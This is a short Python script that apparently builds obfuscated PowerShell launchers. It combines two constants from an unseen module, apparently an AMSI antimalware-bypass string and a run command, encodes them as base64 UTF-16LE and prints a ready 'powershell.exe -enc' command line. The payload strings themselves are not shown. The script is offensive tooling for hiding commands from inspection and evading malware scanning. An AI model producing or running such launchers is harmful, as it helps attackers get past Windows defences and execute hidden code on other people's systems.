#!/bin/env python3
import ak
import base64
import argparse

def main():
  TEMPLATE = f'''{ak.PS_AMSI};{ak.PS_RUNTXT_CMD}'''

  print(f"base64 utf16le encoding: {TEMPLATE}")
  b64_encoded = base64.b64encode(TEMPLATE.encode('utf-16le'))

  b64_str = b64_encoded.decode("utf-8")
  print(b64_str)
  print()
  print(f"Run with: powershell.exe -enc {b64_str}")


if __name__ == "__main__":
  main()
